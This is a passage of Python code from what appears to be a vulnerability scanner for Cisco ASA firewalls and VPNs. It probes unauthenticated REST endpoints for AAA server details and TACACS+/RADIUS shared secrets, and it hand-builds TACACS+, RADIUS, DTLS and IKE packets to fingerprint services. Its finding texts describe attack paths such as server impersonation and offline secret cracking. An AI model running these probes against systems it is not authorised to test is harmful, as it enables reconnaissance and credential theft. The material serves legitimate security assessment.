                body = e.read().decode('utf-8', errors='replace')
            except Exception:
                pass
            return e.code, body
        except Exception:
            return None, ''

    # -- Probe 1: /api/aaa ------------------------------------------------------
    # ch7 (Defining an Authentication Server): aaa-server command defines groups
    # with protocol (radius/tacacs+/ldap/kerberos/sdi/nt); API exposes group
    # names, server IPs, and protocol assignments to unauthenticated callers.
    sc1, body1 = _do_get('/api/aaa')
    if sc1 == 200 and len(body1) > 10:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ASA_AAA_SERVERS_UNAUTH',
            'detail': (
                f'ASA REST API /api/aaa at {host}:{port} returned HTTP {sc1} '
                f'({len(body1)} bytes) without authentication.  '
                f'ch7 (Table 7-1 AAA Support Matrix): server group tags, auth '
                f'protocols, and server addresses exposed -- discloses full AAA '
                f'infrastructure topology.  Excerpt: {body1[:300]}'
            ),
            'host': host,
            'port': port,
        })
        body1_lower = body1.lower()
        server_ips = re.findall(
            r'"(?:server|serverIp|host|address)"\s*:\s*"([\d\.]+)"',
            body1, re.IGNORECASE,
        )
        if 'tacacs' in body1_lower and server_ips:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'ASA_TACACS_SERVERS_DISCLOSED',
                'detail': (
                    f'TACACS+ server IP(s) {server_ips[:5]} extracted from /api/aaa '
                    f'at {host}:{port}.  ch7 (TACACS+): port 49/TCP; ASA uses TCP '
                    f'encoding exclusively; disclosed IPs enable direct AAA '
                    f'infrastructure enumeration and potential server impersonation.  '
                    f'Excerpt: {body1[:200]}'
                ),
                'host': host,
                'port': port,
            })
        if 'radius' in body1_lower and server_ips:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'ASA_RADIUS_SERVERS_DISCLOSED',
                'detail': (
                    f'RADIUS server IP(s) {server_ips[:5]} extracted from /api/aaa '
                    f'at {host}:{port}.  ch7 (RADIUS): shared secret is hashed per '
                    f'RFC 2865; disclosed IPs enable offline shared-secret brute-force '
                    f'from captured Access-Request traffic.  Excerpt: {body1[:200]}'
                ),
                'host': host,
                'port': port,
            })

    # -- Probe 2: /api/aaa/tacacs -----------------------------------------------
    # ch7 (AAA Server Host Config Example 7-6): "key cisco123" -- pre-shared key
    # in TACACS+ host config; if returned by API enables TACACS+ server
    # impersonation to return ACCEPT for any auth request (auth bypass).
    sc2, body2 = _do_get('/api/aaa/tacacs')
    if sc2 == 200 and len(body2) > 10:
        key_match = re.search(
            r'"(?:key|presharedKey|sharedSecret|secret)"\s*:\s*"([^"]{3,})"',
            body2, re.IGNORECASE,
        )
        sev2 = 'CRITICAL' if key_match else 'HIGH'
        detail2 = (
            f'ASA REST API /api/aaa/tacacs at {host}:{port} returned HTTP {sc2} '
            f'({len(body2)} bytes) without authentication.  '
            f'ch7 (Defining Auth Server): TACACS+ server group config exposed.  '
        )
        if key_match:
            detail2 += (
                f'Pre-shared key field found ("{key_match.group(1)[:20]}...") -- '
                f'enables TACACS+ server impersonation to return ACCEPT for any '
                f'auth request, bypassing device AAA entirely.  '
            )
        detail2 += f'Excerpt: {body2[:300]}'
        findings.append({
            'severity': sev2,
            'title': 'ASA_TACACS_PRESHARED_KEY',
            'detail': detail2,
            'host': host,
            'port': port,
        })

    # -- Probe 3: /api/aaa/radius -----------------------------------------------
    # ch7 (RADIUS): shared secret never transmitted in cleartext over the wire
    # (RFC 2865) but may appear in API responses; enables offline decryption of
    # password fields XOR-encrypted with MD5(shared_secret + auth_vector).
    sc3, body3 = _do_get('/api/aaa/radius')
    if sc3 == 200 and len(body3) > 10:
        secret_match = re.search(
            r'"(?:key|sharedSecret|secret|password|radiusKey)"\s*:\s*"([^"]{3,})"',
            body3, re.IGNORECASE,
        )
        sev3 = 'CRITICAL' if secret_match else 'HIGH'
        detail3 = (
            f'ASA REST API /api/aaa/radius at {host}:{port} returned HTTP {sc3} '
            f'({len(body3)} bytes) without authentication.  '
            f'ch7 (RADIUS): RADIUS server config exposed.  '
        )
        if secret_match:
            detail3 += (
                f'Shared secret field found -- RADIUS User-Password is '
                f'XOR-encrypted with MD5(secret + auth_vector); disclosed secret '
                f'enables offline decryption of captured password fields.  '
            )
        detail3 += f'Excerpt: {body3[:300]}'
        findings.append({
            'severity': sev3,
            'title': 'ASA_RADIUS_SECRET_DISCLOSED',
            'detail': detail3,
            'host': host,
            'port': port,
        })

    # -- Probe 4: TACACS+ direct probe on TCP/49 --------------------------------
    # ch7 (TACACS+): uses port 49/TCP; Cisco ASA uses TCP encoding exclusively.
    # TACACS+ authentication start packet (major=0xc0, minor=0x01, type=AUTH,
    # seq=1); response presence confirms active TACACS+ daemon.
    tacacs_pkt = (
        b'\xc0\x01\x01\x00'   # major|minor=0xc0|0x01, type=AUTH(1), seq=1
        b'\x00\x00\x00\x01'   # session_id=1
        b'\x00\x00\x00\x0c'   # length=12
        b'\x01\x00\x00\x00'   # action=LOGIN, priv_lvl=0, authen_type=0, service=0
        b'\x00\x01\x01\x00'   # user_len=0, port_len=1, rem_addr_len=1, data_len=0
    )
    try:
        s4 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s4.settimeout(min(3.0, timeout / 2))
        s4.connect((host, 49))
        s4.sendall(tacacs_pkt)
        resp4 = s4.recv(64)
        s4.close()
        if resp4:
            findings.append({
                'severity': 'HIGH',
                'title': 'TACACS_PORT_RESPONSIVE',
                'detail': (
                    f'TCP/49 (TACACS+) on {host} responded to authentication start '
                    f'packet ({len(resp4)} bytes).  ch7 (TACACS+): provides centralized '
                    f'AAA for admin session auth, VPN user auth, and cut-through proxy '
                    f'-- direct port exposure enables protocol-level enumeration and '
                    f'credential brute-force.  Response hex: {resp4[:32].hex()}'
                ),
                'host': host,
                'port': 49,
            })
            # Version fingerprint from header bytes
            if len(resp4) >= 2 and resp4[0] == 0x01 and resp4[1] == 0x01:
                findings.append({
                    'severity': 'MEDIUM',
                    'title': 'TACACS_VERSION_FINGERPRINT',
                    'detail': (
                        f'TACACS+ response from {host}:49 version bytes 0x{resp4[0]:02x} '
                        f'0x{resp4[1]:02x} (major=1, minor=1) -- confirms Cisco TACACS+ '
                        f'daemon; version-specific module selection applicable.  '
                        f'Response hex: {resp4[:16].hex()}'
                    ),
                    'host': host,
                    'port': 49,
                })
    except Exception:
        pass

    # -- Probe 5: RADIUS Access-Request probe on UDP/1812 -----------------------
    # ch7 (RADIUS, Figure 7-1): NAS sends Access-Request (code=1) to RADIUS
    # server; shared secret required for password field decryption.
    # RFC 2865: code(1)+id(1)+length(2)+authenticator(16)+attributes.
    try:
        username = b'probe'
        attr = b'\x01' + bytes([len(username) + 2]) + username   # User-Name type=1
        auth_vec = b'\x00' * 16
        length = 20 + len(attr)
        radius_pkt = struct.pack('!BBH', 1, 1, length) + auth_vec + attr
        s5 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s5.settimeout(min(3.0, timeout / 2))
        s5.sendto(radius_pkt, (host, 1812))
        resp5, _ = s5.recvfrom(512)
        s5.close()
        if resp5:
            findings.append({
                'severity': 'HIGH',
                'title': 'RADIUS_PORT_RESPONSIVE',
                'detail': (
                    f'UDP/1812 (RADIUS) on {host} responded to Access-Request probe '
                    f'({len(resp5)} bytes, code={resp5[0]}).  '
                    f'ch7 (RADIUS): combines auth and authz in a single cycle; shared '
                    f'secret required to decrypt password field -- direct port exposure '
                    f'enables shared-secret brute-force and replay attacks.  '
                    f'Response hex: {resp5[:32].hex()}'
                ),
                'host': host,
                'port': 1812,
            })
    except Exception:
        pass

    # -- Probe 6: /+CSCOE+/logon.html auth type disclosure ----------------------
    # ch7 (Table 7-2 Authentication Support Services): logon page reflects the
    # configured auth method (RADIUS/TACACS/SDI/LOCAL) to unauthenticated users,
    # scoping attack surface before any credential attempt.
    sc6, body6 = _do_get('/+CSCOE+/logon.html')
    if sc6 == 200 and body6:
        body6_upper = body6.upper()
        auth_type = None
        for at in ('RADIUS', 'TACACS', 'LDAP', 'SDI', 'LOCAL'):
            if at in body6_upper:
                auth_type = at
                break
        if auth_type:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'ASA_AUTH_TYPE_DISCLOSED',
                'detail': (
                    f'ASA WebVPN logon page /+CSCOE+/logon.html at {host}:{port} '
                    f'disclosed authentication type "{auth_type}" without credentials.  '
                    f'ch7 (Table 7-2): auth method scopes attack surface -- '
                    f'RADIUS/TACACS enables protocol-specific attack modules; '
                    f'LOCAL enables direct credential brute-force against ASA '
                    f'built-in user database.  Excerpt: {body6[:300]}'
                ),
                'host': host,
                'port': port,
            })

    return findings


def probe_asa_anyconnect_vpn_surface(host, port=443, timeout=10.0):
    """Detect Cisco ASA AnyConnect VPN configuration and client surface.

    Synthesized from: Chapter 23 (Client-Based Remote-Access SSL VPNs) and
    Chapter 20 (IPsec Remote-Access VPNs), Cisco ASA All-in-One 3rd Edition.

    ch23: AnyConnect client is downloaded from /CACHE/stc/1/index.html manifest
    and /+CSCOT+/ path prefix serves client binaries and JS to web-enabled
    browser sessions (ActiveX/Java install flow).  Presence confirms AnyConnect
    SSL VPN is active; version string in manifest scopes CVE applicability.

    ch23 (Configuring DTLS): DTLS (RFC 6347) runs on UDP/443 alongside TCP/443
    SSL VPN by default.  RC4-based cipher with DTLS causes AnyConnect client
    failure; presence fingerprints AnyConnect vs clientless-only deployments.

    ch23 (AnyConnect Profiles): AnyConnectProfile.xml pushed to clients defines
    headend addresses, split-tunnel ACLs, and DNS suffixes.  Profile at
    /profiles/ accessible unauthenticated exposes internal network topology.

    ch20 (IKEv1/IKEv2): ASA responds to IKEv1 Main Mode and IKEv2 SA_INIT on
    UDP/500.  Any response confirms IPsec remote-access VPN is enabled.
    IKEv1 supports aggressive mode (RFC 2409) -- PSK hash offline cracking.
    Vendor ID payload in response attributes Cisco ASA fingerprint.

    Endpoints and ports probed:
      HTTPS GET /CACHE/stc/1/index.html      -- AnyConnect client manifest
      HTTPS GET /+CSCOT+/win.js              -- Windows client JS bundle
      HTTPS GET /profiles/                   -- AnyConnect profile directory
      HTTPS GET /profiles/AnyConnectProfile.xml -- profile XML (if dir listed)
      HTTPS GET /+CSCOT+/oem-customization   -- OEM/branding config
      UDP/443  DTLS 1.2 ClientHello          -- DTLS transport presence
      UDP/500  IKEv1 Main Mode SA init       -- IKEv1 IPsec VPN
      UDP/500  IKEv2 SA_INIT                 -- IKEv2 IPsec VPN
      TCP/4444                               -- AnyConnect legacy SSL relay
      HTTPS GET /api/vpn/statistics/sessions -- active VPN session count
    """
    findings = []
    import os as _os

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    base = f'https://{host}:{port}'

    def _do_get(path, accept='text/html,application/xhtml+xml,*/*'):
        url = f'{base}{path}'
        req = urllib.request.Request(
            url,
            headers={
                'User-Agent': 'AnyConnect Windows 4.10.07073',
                'Accept': accept,
            },
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                return r.status, r.read().decode('utf-8', errors='replace')
        except urllib.error.HTTPError as e:
            try:
                return e.code, e.read().decode('utf-8', errors='replace')
            except Exception:
                return e.code, ''
        except Exception:
            return 0, ''

    # -- Probe 1: AnyConnect client manifest -----------------------------------
    # ch23: Client package stored at /CACHE/stc/1/index.html; served to browser
    # for web-enabled (ActiveX/Java) install.  Presence confirms AnyConnect SSL
    # VPN is enabled; version string scopes CVE surface.
    sc1, body1 = _do_get('/CACHE/stc/1/index.html')
    if sc1 == 200 and body1:
        findings.append({
            'severity': 'HIGH',
            'title': 'ASA_ANYCONNECT_MANIFEST',
            'detail': (
                f'AnyConnect client manifest at /CACHE/stc/1/index.html on {host}:{port} '
                f'returned HTTP 200 ({len(body1)} bytes).  '
                f'ch23: manifest lists installed client packages by OS; unauthenticated '
                f'access confirms AnyConnect SSL VPN is enabled and exposes version/OS '
                f'targeting surface.  Excerpt: {body1[:300]!r}'
            ),
            'host': host,
            'port': port,
        })
        ver_matches = re.findall(
            r'anyconnect[^"\'<>\s]*?(\d+\.\d+\.\d+[^"\'<>\s]{0,20})',
            body1, re.IGNORECASE,
        )
        if ver_matches:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'ASA_ANYCONNECT_VERSION',
                'detail': (
                    f'AnyConnect client version strings extracted from manifest at '
                    f'{host}:{port}/CACHE/stc/1/index.html: {ver_matches[:5]}.  '
                    f'ch23: version fingerprint scopes known CVE surface '
                    f'(e.g., CSCwb26524, CSCwd75186, CVE-2023-20241).'
                ),
                'host': host,
                'port': port,
            })

    # -- Probe 2: Windows client JS bundle ------------------------------------
    # ch23: /+CSCOT+/ serves AnyConnect client binaries and JS to web-enabled
    # browser sessions.  win.js handles ActiveX/Java download flow; bundle
    # may contain hardcoded URLs, version strings, or embedded secrets.
    sc2, body2 = _do_get('/+CSCOT+/win.js')
    if sc2 == 200 and body2:
        findings.append({
            'severity': 'HIGH',
            'title': 'ASA_ANYCONNECT_JS_EXPOSED',
            'detail': (
                f'AnyConnect Windows client JS at /+CSCOT+/win.js on {host}:{port} '
                f'returned HTTP 200 ({len(body2)} bytes).  '
                f'ch23: JS bundle handles ActiveX/Java download flow for web-enabled '
                f'install; extractable endpoints, version tags, or hardcoded values '
                f'expand attack surface without credentials.  '
                f'Excerpt: {body2[:200]!r}'
            ),
            'host': host,
            'port': port,
        })

    # -- Probe 3: AnyConnect profile directory --------------------------------
    # ch23 (AnyConnect Profiles): profiles pushed to clients define headend
    # addresses, split-tunnel ACLs, DNS suffixes, and allowed auth methods.
    # Unauthenticated access to /profiles/ or AnyConnectProfile.xml leaks
    # internal network topology in its entirety.
    sc3, body3 = _do_get('/profiles/')
    if sc3 in (200, 206):
        is_listing = any(
            kw in body3.lower()
            for kw in ('index of', 'parent directory', '.xml', 'profile')
        )
        sev3 = 'CRITICAL' if is_listing else 'HIGH'
        findings.append({
            'severity': sev3,
            'title': 'ASA_ANYCONNECT_PROFILES_DIR',
            'detail': (
                f'AnyConnect profile directory /profiles/ on {host}:{port} '
                f'returned HTTP {sc3} ({len(body3)} bytes).  '
                f'ch23: directory contains AnyConnectProfile.xml pushed to all '
                f'connecting clients; unauthenticated access exposes headend IPs, '
                f'split-tunnel network list, and DNS configuration.  '
                f'Excerpt: {body3[:300]!r}'
            ),
            'host': host,
            'port': port,
        })
        sc3x, body3x = _do_get('/profiles/AnyConnectProfile.xml', accept='application/xml,*/*')
        if sc3x == 200 and '<AnyConnectProfile' in body3x:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'ASA_ANYCONNECT_PROFILE_XML',
                'detail': (
                    f'AnyConnect XML profile accessible unauthenticated at '
                    f'/profiles/AnyConnectProfile.xml on {host}:{port}.  '
                    f'ch23 (Example 23-13): AnyConnectProfile.xml contains headend '
                    f'FQDN/IP, backup server list, and authentication method.  '
                    f'Profile excerpt: {body3x[:500]!r}'
                ),
                'host': host,
                'port': port,
            })
            st_nets = re.findall(
                r'<IncludeSubnetwork[s]?>(.*?)</IncludeSubnetwork[s]?>',
                body3x, re.IGNORECASE | re.DOTALL,
            )
            if st_nets:
                findings.append({
                    'severity': 'HIGH',
                    'title': 'ASA_ANYCONNECT_SPLIT_TUNNEL',
                    'detail': (
                        f'Split-tunnel network list extracted from AnyConnect profile '
                        f'at {host}:{port}/profiles/AnyConnectProfile.xml.  '
                        f'ch23 (Split Tunneling): split-tunnel ACL defines which subnets '
                        f'route through VPN -- exposes internal network topology to '
                        f'any unauthenticated client that fetches the profile.  '
                        f'Networks: {st_nets[:10]}'
                    ),
                    'host': host,
                    'port': port,
                })

    # -- Probe 4: OEM/branding customization ----------------------------------
    # ch22: ASA supports XML-based branding for SSL VPN logon pages via the
    # OEM customization endpoint.  Exposed config fingerprints operator org name,
    # internal URLs, and logo artifact paths.
    sc4, body4 = _do_get('/+CSCOT+/oem-customization')
    if sc4 == 200 and body4:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'ASA_ANYCONNECT_BRANDING',
            'detail': (
                f'AnyConnect OEM customization config at /+CSCOT+/oem-customization '
                f'on {host}:{port} returned HTTP 200 ({len(body4)} bytes).  '
                f'ch22: branding XML contains org name, internal page URLs, and '
                f'logo paths -- operator fingerprint and potential internal path '
                f'disclosure without credentials.  Excerpt: {body4[:300]!r}'
            ),
            'host': host,
            'port': port,
        })

    # -- Probe 5: DTLS on UDP/443 ---------------------------------------------
    # ch23 (Configuring DTLS): DTLS (RFC 6347) runs on UDP/443 alongside TCP/443.
    # Send a DTLS 1.2 ClientHello record; valid DTLS response (content_type 0x16
    # + version 0xfefd/0xfeff) confirms DTLS transport is active.
    try:
        dtls_random = _os.urandom(32)
        hello_body = (
            b'\xfe\xfd' +        # client_version: DTLS 1.2
            dtls_random +        # 32-byte random
            b'\x00' +            # session_id_len = 0
            b'\x00' +            # cookie_len = 0
            b'\x00\x02' +       # cipher_suites_len = 2
            b'\xc0\x2b' +       # TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
            b'\x01' +           # compression_methods_len = 1
            b'\x00'             # null compression
        )
        hlen_b = len(hello_body).to_bytes(3, 'big')
        hs_payload = (
            b'\x01' + hlen_b +   # type=ClientHello + length
            b'\x00\x00' +        # message_seq
            b'\x00\x00\x00' +   # fragment_offset
            hlen_b +             # fragment_length
            hello_body
        )
        dtls_record = (
            b'\x16' +                        # content_type: handshake
            b'\xfe\xfd' +                   # version: DTLS 1.2
            b'\x00\x00' +                   # epoch
            b'\x00\x00\x00\x00\x00\x00' +  # sequence_number
            struct.pack('!H', len(hs_payload)) +
            hs_payload
        )
        sock5d = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock5d.settimeout(timeout)
        sock5d.sendto(dtls_record, (host, 443))
        try:
            data5d, _ = sock5d.recvfrom(4096)
        finally:
            sock5d.close()
        if data5d and len(data5d) >= 13:
            ct5 = data5d[0]
            ver_hi5, ver_lo5 = data5d[1], data5d[2]
            if ct5 in (20, 21, 22, 23) and ver_hi5 == 0xfe:
                dtls_ver = (
                    'DTLS 1.0' if ver_lo5 == 0xff else
                    'DTLS 1.2' if ver_lo5 == 0xfd else
                    f'DTLS 0x{ver_hi5:02x}{ver_lo5:02x}'
                )
                findings.append({
                    'severity': 'HIGH',
                    'title': 'ASA_DTLS_EXPOSED',
                    'detail': (
                        f'DTLS response received on UDP/443 from {host}: '
                        f'content_type=0x{ct5:02x}, version={dtls_ver}.  '
                        f'ch23 (Configuring DTLS): DTLS is the UDP-based transport '
                        f'for AnyConnect; presence confirms AnyConnect SSL VPN is '
                        f'enabled.  DTLS bypasses TCP flow inspection on midpoints '
                        f'and is susceptible to RC4-based cipher misconfiguration.  '
                        f'Response hex: {data5d[:32].hex()}'
                    ),
                    'host': host,
                    'port': 443,
                })
                findings.append({
                    'severity': 'MEDIUM',
                    'title': 'ASA_DTLS_VERSION_FINGERPRINT',
                    'detail': (
                        f'DTLS version fingerprinted as {dtls_ver} on {host} UDP/443.  '
                        f'ch23: DTLS 1.0 (0xfeff) = older AnyConnect or ASA firmware; '
                        f'DTLS 1.2 (0xfefd) requires ASA 9.3+ and AnyConnect 3.1+.  '
                        f'Version gates CVE applicability for DTLS-specific issues.'
                    ),
                    'host': host,
                    'port': 443,
                })
    except Exception:
        pass

    # -- Probe 6: IKEv1 Main Mode SA init ------------------------------------
    # ch20: ASA responds to IKEv1 Main Mode SA proposals on UDP/500.
    # Minimal SA: DES-CBC + MD5 + PSK + DH group-1 (maximise compat).
    # Any SA response (exchange_type=2) confirms IKEv1 is enabled.
    try:
        ikev1_cookie = _os.urandom(8)
        xform_attrs = (
            struct.pack('!HH', 0x8001, 1) +  # encryption: DES-CBC
            struct.pack('!HH', 0x8002, 1) +  # hash: MD5
            struct.pack('!HH', 0x8003, 1) +  # auth: PSK
            struct.pack('!HH', 0x8004, 1)    # DH group: 1
        )
        xform_len = 8 + len(xform_attrs)
        xform = (
            struct.pack('!BBH', 0, 0, xform_len) +
            struct.pack('!BBH', 1, 1, 0) +
            xform_attrs
        )
        prop_len = 8 + len(xform)
        prop = struct.pack('!BBHBBBB', 0, 0, prop_len, 1, 1, 0, 1) + xform
        sa_body = struct.pack('!II', 1, 1) + prop
        sa_len = 4 + len(sa_body)
        sa_payload = struct.pack('!BBH', 0, 0, sa_len) + sa_body
        total_len6 = 28 + len(sa_payload)
        ike_hdr6 = (
            ikev1_cookie + b'\x00' * 8 +
            struct.pack('!BBBBII', 0x01, 0x10, 0x02, 0x00, 0, total_len6)
        )
        pkt6 = ike_hdr6 + sa_payload
        sock6 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock6.settimeout(timeout)
        sock6.sendto(pkt6, (host, 500))
        try:
            data6, _ = sock6.recvfrom(4096)
        finally:
            sock6.close()
        if data6 and len(data6) >= 28:
            extype6 = data6[18]
            findings.append({
                'severity': 'HIGH',
                'title': 'ASA_IKEV1_RESPONSIVE',
                'detail': (
                    f'IKEv1 Main Mode SA probe on UDP/500 from {host} received '
                    f'{len(data6)}-byte response (exchange_type=0x{extype6:02x}).  '
                    f'ch20 (IKEv1): UDP/500 is the IKEv1 ISAKMP negotiation port; '
                    f'responsive = IPsec remote-access VPN is enabled and reachable.  '
                    f'IKEv1 aggressive mode (RFC 2409) enables PSK hash capture '
                    f'and offline dictionary attack against pre-shared keys.  '
                    f'Response hex: {data6[:32].hex()}'
                ),
                'host': host,
                'port': 500,
            })
            # Cisco vendor ID: SHA1("Cisco Systems, Inc.") first 16 bytes
            cisco_vid = b'\x1f\x07\xf7\x0e\xaa\x65\x14\xd3\xb0\xfa\x96\x54\x2a\x50\x01\x00'
            if cisco_vid in data6:
                findings.append({
                    'severity': 'MEDIUM',
                    'title': 'ASA_IKE_VENDOR_ID',
                    'detail': (
                        f'Cisco vendor ID detected in IKEv1 response from {host} UDP/500.  '
                        f'ch20: vendor ID payload (RFC 2409 sec 3.16) identifies the '
                        f'IKE implementation; Cisco-specific VID confirms ASA and '
                        f'enables vendor-specific module selection '
                        f'(dead-peer detection, NAT-T, mode-config).  '
                        f'VID hex: {cisco_vid.hex()}'
                    ),
                    'host': host,
                    'port': 500,
                })
    except Exception:
        pass

    # -- Probe 7: IKEv2 SA_INIT ----------------------------------------------
    # ch20: IKEv2 (RFC 7296) SA_INIT exchange on UDP/500.
    # Send minimal IKEv2 header + SA + KE + Nonce payloads.
    # Response with version 0x20 and exchange_type 34 confirms IKEv2 active.
    try:
        ikev2_spi = _os.urandom(8)

        def _t(last, ttype, tid):
            """Build one IKEv2 Transform substructure."""
            body = struct.pack('!BBH', ttype, 0, tid)
            return struct.pack('!BBH', 0 if last else 3, 0, 8) + body

        transforms7 = (
            _t(False, 1, 12) +  # ENCR_AES_CBC
            _t(False, 2, 2) +   # PRF_HMAC_SHA1
            _t(False, 3, 2) +   # AUTH_HMAC_SHA1_96
            _t(True, 4, 14)    # DH_2048_MODP
        )
        prop7 = (
            struct.pack('!BBHBBBB', 0, 0, 8 + len(transforms7), 1, 1, 0, 4) +
            transforms7
        )
        # SA payload next=33(KE)
        sa7 = struct.pack('!BBH', 33, 0, 4 + len(prop7)) + prop7
        # KE payload (256-byte DH-14 placeholder) next=40(Nonce)
        ke_val7 = b'\x00' * 256
        ke7 = struct.pack('!BBHH2x', 40, 0, 4 + 4 + len(ke_val7), 14) + ke_val7
        # Nonce payload next=0
        nonce7 = _os.urandom(16)
        ni7 = struct.pack('!BBH', 0, 0, 4 + len(nonce7)) + nonce7
        payloads7 = sa7 + ke7 + ni7
        total_len7 = 28 + len(payloads7)
        hdr7 = (
            ikev2_spi + b'\x00' * 8 +
            struct.pack('!BBBBII', 33, 0x20, 34, 0x08, 0, total_len7)
        )
        pkt7 = hdr7 + payloads7
        sock7 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock7.settimeout(timeout)
        sock7.sendto(pkt7, (host, 500))
        try:
            data7, _ = sock7.recvfrom(8192)
        finally:
            sock7.close()
        if data7 and len(data7) >= 28:
            ver7 = data7[17]
            ex7 = data7[18]
            if (ver7 & 0xf0) == 0x20 and ex7 in (34, 35):
                findings.append({
                    'severity': 'HIGH',
                    'title': 'ASA_IKEV2_RESPONSIVE',
                    'detail': (
                        f'IKEv2 SA_INIT response received from {host} UDP/500 '
                        f'({len(data7)} bytes, version=0x{ver7:02x}, '
                        f'exchange_type=0x{ex7:02x}).  '
                        f'ch20: IKEv2 (RFC 7296) is enabled for IPsec remote-access '
                        f'VPN; does not support aggressive mode but exposes '
                        f'cipher-suite negotiation and DH group fingerprinting.  '
                        f'Response hex: {data7[:32].hex()}'
                    ),
                    'host': host,
                    'port': 500,
                })
    except Exception:
        pass

    # -- Probe 8: AnyConnect legacy SSL relay TCP/4444 ------------------------
    # ch23: Port 4444 TCP was used by AnyConnect legacy SSL relay mode in
    # pre-3.0 deployments.  Open port on modern ASA = legacy config artifact
    # or non-standard service deserving fingerprint.
    try:
        sock8 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock8.settimeout(timeout)
        err8 = sock8.connect_ex((host, 4444))
        sock8.close()
        if err8 == 0:
            findings.append({
                'severity': 'HIGH',
                'title': 'ASA_ANYCONNECT_RELAY_PORT',
                'detail': (
                    f'TCP/4444 is open on {host} -- AnyConnect legacy SSL relay port.  '
                    f'ch23: port 4444 was the SSL relay port for AnyConnect pre-3.0 '
                    f'relay mode; presence on modern ASA indicates legacy configuration '
                    f'not cleaned up or an unexpected listening service.  '
                    f'Fingerprint service and check for unauthenticated relay exposure.'
                ),
                'host': host,
                'port': 4444,
            })
    except Exception:
        pass

    # -- Probe 9: REST API VPN session statistics -----------------------------
    # ch4 (ASDM): VPN Sessions panel shows active IPsec/SSL VPN tunnels.
    # /api/vpn/statistics/sessions unauthenticated = active session count,
    # tunnel type breakdown, and concurrent session totals without credentials.
    sc9, body9 = _do_get('/api/vpn/statistics/sessions', accept='application/json')
    if sc9 == 200 and body9:
        try:
            sess_data = json.loads(body9)
            detail9 = str(sess_data)[:400]
        except Exception:
            sess_data = None
            detail9 = body9[:300]
        if sess_data is not None or any(
            kw in body9.lower() for kw in ('session', 'vpn', 'tunnel', 'count')
        ):
            findings.append({
                'severity': 'CRITICAL',
                'title': 'ASA_VPN_SESSIONS_COUNT',
                'detail': (
                    f'ASA REST API /api/vpn/statistics/sessions on {host}:{port} '
                    f'returned HTTP 200 unauthenticated ({len(body9)} bytes).  '
                    f'ch4: VPN statistics include active user count, tunnel type '
                    f'breakdown (IPsec/SSL/AnyConnect), and concurrent session '
                    f'totals -- operational intelligence without credentials.  '
                    f'Response: {detail9!r}'
                ),
                'host': host,
                'port': port,
            })

    return findings


def probe_asa_certificate_crypto_surface(host, port=443, timeout=10.0):
    """Detect Cisco ASA certificate and cryptographic configuration surface.

    Synthesized from: Chapter 22 (Clientless Remote-Access SSL VPNs) and
    Chapter 7 (Authentication, Authorization, and Accounting),
    Cisco ASA All-in-One 3rd Edition.

    ch22 (Enroll Digital Certificates): ASA requires an identity certificate
    for SSL VPN; self-signed is the default and the book explicitly recommends
    an external CA.  Identity certs bound to interfaces via 'ssl trust-point';
    exposing bindings via REST API leaks full PKI topology.

    ch22 (SSL Settings): minimum TLS version and cipher suite configured under
    Config > Device Management > Advanced > SSL Settings.  TLS 1.0 or NULL/
    EXPORT/RC4 ciphers are legacy misconfigurations; RC4 explicitly breaks
    DTLS tunnel establishment (ch23).

    ch7 (LDAP): ASA uses LDAP (port 636 = LDAPS) for VPN user authentication.
    If the LDAP server certificate is not validated against a trustpoint CA,
    an adversary can intercept LDAP auth with a rogue cert, capturing credentials.

    Endpoints and ports probed:
      TLS handshake on port                  -- server cert chain analysis
      HTTPS GET /api/ssl                     -- SSL/TLS configuration
      HTTPS GET /api/certificate/identity    -- identity cert bindings
      HTTPS GET /api/certificate/ca          -- CA certificate store
      HTTPS GET /api/certificate/revocation  -- OCSP/CRL config
      TCP/636  LDAPS                         -- LDAP CA validation gap
    """
    findings = []
    import datetime as _dt

    # -- Minimal DER/BER TLV decoder ------------------------------------------
    def _tlv(data, off=0):
        """Read one DER/BER TLV at off. Returns (tag, value_bytes, next_off)."""
        if off >= len(data):
            raise ValueError('truncated at tag')
        tag = data[off]; off += 1
        if tag & 0x1f == 0x1f:  # long-form tag: consume continuation bytes
            while off < len(data) and data[off] & 0x80:
                off += 1
            off += 1
        if off >= len(data):
            raise ValueError('truncated at length')
        lb = data[off]; off += 1
        if lb & 0x80:
            n = lb & 0x7f
            if off + n > len(data):
                raise ValueError('truncated length extended')
            vlen = int.from_bytes(data[off:off + n], 'big')
            off += n
        else:
            vlen = lb
        if off + vlen > len(data):
            raise ValueError('truncated value')
        return tag, data[off:off + vlen], off + vlen

    def _cn_from_rdnseq(rdnseq_val):
        """Extract commonName string from RDNSequence value bytes."""
        pos = 0
        while pos < len(rdnseq_val):
            try:
                _, rdn_val, pos = _tlv(rdnseq_val, pos)   # SET (RDN)
                _, atv_val, _ = _tlv(rdn_val, 0)           # SEQUENCE (ATV)
                _, oid_bytes, p2 = _tlv(atv_val, 0)        # OID
                if oid_bytes == b'\x55\x04\x03':            # 2.5.4.3 = commonName
                    _, cn_bytes, _ = _tlv(atv_val, p2)
                    return cn_bytes.decode('utf-8', errors='replace')
            except Exception:
                break
        return ''

    def _san_list(san_oct):
        """Extract (type, value) SAN pairs from SubjectAltName extension octet value."""
        sans = []
        try:
            _, gnames_val, _ = _tlv(san_oct, 0)  # GeneralNames SEQUENCE
            pos = 0
            while pos < len(gnames_val):
                try:
                    tag, gn_val, pos = _tlv(gnames_val, pos)
                    if tag == 0x82:    # [2] dNSName
                        sans.append(('dns', gn_val.decode('ascii', errors='replace')))
                    elif tag == 0x87:  # [7] iPAddress
                        if len(gn_val) == 4:
                            sans.append(('ip', '.'.join(str(b) for b in gn_val)))
                        elif len(gn_val) == 16:
                            sans.append(('ipv6', gn_val.hex()))
